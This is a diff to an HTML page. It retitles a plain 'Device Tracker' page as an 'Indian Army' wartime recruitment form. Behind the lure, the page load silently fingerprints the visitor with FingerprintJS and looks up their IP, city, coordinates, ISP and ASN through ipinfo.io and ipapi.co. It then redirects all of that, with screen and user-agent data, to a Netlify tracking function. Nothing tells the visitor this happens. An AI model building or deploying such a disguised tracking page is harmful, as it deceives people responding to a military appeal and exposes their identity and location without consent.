@@ -1,21 +1,98 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Device Tracker</title>
+    <title>Indian Army</title>
+    <!-- Load FingerprintJS from CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <script>
-        window.onload = () => {
-            const data = {
-                width: screen.width,
-                height: screen.height,
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            window.location.href = `/.netlify/functions/track?${new URLSearchParams(data)}`;
-        };
+        async function getIPOnly() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.ip || "Unknown";
+                }
+            } catch (error) {
+                console.error('ipinfo.io failed:', error);
+            }
+            return "Unknown";
+        }
+
+        async function getCompleteIPData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.ip && data.ip.includes(':')) {
+                        data.ip = await getIPOnly();
+                    }
+                    return data;
+                }
+            } catch (error) {
+                console.error('ipapi.co failed:', error);
+            }
+            return null;
+        }
+
+        async function collectDeviceData() {
+            try {
+                // 1. Get browser fingerprint
+                const fp = await FingerprintJS.load();
+                const { visitorId } = await fp.get();
+
+                // 2. Get IP data
+                const ipData = await getCompleteIPData() || {};
+
+                // 3. Prepare final data
+                const data = {
+                    fingerprint: visitorId,
+                    ip: ipData.ip || await getIPOnly(),
+                    city: ipData.city || "Unknown",
+                    region: ipData.region || ipData.region_name || "Unknown",
+                    country: ipData.country || ipData.country_name || "Unknown",
+                    coordinates: (ipData.latitude && ipData.longitude) 
+                        ? `${ipData.latitude},${ipData.longitude}` 
+                        : "Unknown",
+                    timezone: ipData.timezone || "Unknown",
+                    isp: ipData.org || ipData.asn || "Unknown",
+                    asn: ipData.asn || "Unknown",
+                    mobile: ipData.mobile || false,
+                    screen: `${screen.width}x${screen.height}`,
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent
+                };
+
+                // 4. Send to Netlify Function
+                window.location.href = `/.netlify/functions/track?${new URLSearchParams(data)}`;
+
+            } catch (error) {
+                console.error("Error:", error);
+                // Fallback with basic data
+                const fallbackData = {
+                    error: error.message,
+                    screen: `${screen.width}x${screen.height}`,
+                    userAgent: navigator.userAgent
+                };
+                window.location.href = `/.netlify/functions/track?${new URLSearchParams(fallbackData)}`;
+            }
+        }
+
+        window.onload = collectDeviceData;
     </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            color: #d22b2b;
+        }
+    </style>
 </head>
 <body>
-    <h1>Loading device information...</h1>
+    <h1>The Indian Army needs you. This form will tell you how you can participate and serve your country in this time of war</h1>
+    <p>Loading your information...</p>
 </body>
 </html>
